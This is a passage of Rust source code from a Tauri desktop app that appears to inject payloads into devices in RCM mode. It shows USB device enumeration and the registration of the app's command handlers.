                        }

                        let manufacturer = device
                            .open()
                            .ok()
                            .and_then(|h| h.read_manufacturer_string_ascii(&desc).ok());

                        let product = device
                            .open()
                            .ok()
                            .and_then(|h| h.read_product_string_ascii(&desc).ok());

                        let serial_number = device
                            .open()
                            .ok()
                            .and_then(|h| h.read_serial_number_string_ascii(&desc).ok());

                        device_list.push(DeviceInfo {
                            vendor_id: desc.vendor_id(),
                            product_id: desc.product_id(),
                            manufacturer,
                            product,
                            serial_number,
                        });
                    }
                    Err(_) => continue,
                }
            }

            Ok(device_list)
        }
        Err(e) => Err(format!("Failed to enumerate USB devices: {}", e)),
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_store::Builder::new().build())
        .invoke_handler(tauri::generate_handler![
            greet,
            detect_rcm_device,
            get_rcm_status,
            list_usb_devices,
            inject_payload,
            download_payload,
            // >> new command added here! <<
            get_app_version 
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
